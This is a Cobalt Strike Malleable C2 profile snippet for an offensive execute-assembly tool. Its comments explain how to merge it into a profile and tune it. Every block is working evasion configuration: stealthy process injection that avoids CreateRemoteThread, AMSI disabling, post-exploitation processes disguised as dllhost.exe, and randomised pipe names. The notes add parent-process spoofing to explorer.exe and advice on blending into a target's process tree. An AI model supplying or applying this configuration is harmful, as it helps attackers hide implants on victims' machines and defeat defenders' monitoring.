# Recommended Malleable C2 profile snippet for senjata-execute-assembly v0.3+.
# Drop into your existing profile alongside the http-* / dns-* / stage {} blocks.
# Re-load via teamserver restart or `Profile -> Reload` in CS Client.

process-inject {
    set allocator     "NtMapViewOfSection";
    set startrwx      "false";
    set userwx        "false";
    set min_alloc     "17500";

    transform-x64 {
        prepend "\x90\x90\x90";
    }

    execute {
        NtQueueApcThread-s "ntdll.dll!RtlUserThreadStart";
        SetThreadContext;
        # CreateRemoteThread + CreateThread deliberately omitted.
    }
}

post-ex {
    set spawnto_x64    "%windir%\\System32\\dllhost.exe";
    set spawnto_x86    "%windir%\\SysWOW64\\dllhost.exe";
    set thread_hint    "ntdll.dll!RtlUserThreadStart+0x21";
    set smartinject    "true";
    set obfuscate      "true";
    set cleanup        "true";
    set pipename       "postex_########";
    set amsi_disable   "true";
}

stage {
    set userwx       "false";
    set cleanup      "true";
    set obfuscate    "true";
    set sleep_mask   "true";
}

# Notes
# -----
# 0. PPID spoofing — Malleable C2 has NO `set ppid` directive. To auto-spoof
#    PPID to explorer.exe on every beacon check-in, load the companion
#    Aggressor script alongside this profile:
#      docs/profiles/senjata-auto-ppid.cna
#    via CS Client → Script Manager → Load. The script hooks `beacon_initial`,
#    runs ps, finds explorer.exe in the beacon's session, and calls
#    bppid(<pid>). All subsequent spawns / injections from that beacon
#    inherit explorer.exe as parent — process tree looks like a normal user
#    session instead of "beacon spawns dllhost".
#
# 1. This file is a SNIPPET, not a complete profile. You must combine it with
#    your existing http-*/dns-*/global {} blocks. If your profile already has
#    process-inject {} or post-ex {} blocks, MERGE field-by-field; do not
#    paste both copies (CS rejects duplicate keys at profile compile time).
#
# 2. process-inject.execute order matters. CS tries each method in turn until
#    one succeeds. NtQueueApcThread-s (Earliest-Bird APC) requires CS to
#    spawn the sacrificial suspended; combined with NtMapViewOfSection it
#    avoids CreateRemoteThread and VirtualAllocEx entirely.
#
# 3. set pipename "postex_########" — the # placeholders are randomized
#    per-run by CS. A static pipe name is a behavioural IOC.
#
# 4. set spawnto_x64 — adjust to whatever blends with the target's normal
#    process tree. dllhost.exe (COM surrogate) is a sensible default;
#    werfault.exe / rundll32.exe / wuapihost.exe are alternatives.
#    Avoid notepad.exe in production — it's an obvious flag.
#
# 5. set smartinject "true" — required for our HWBP-based bypasses to work
#    correctly. Disabling it forces APC-based deferred resolution which can
#    race with our HWBP installs.
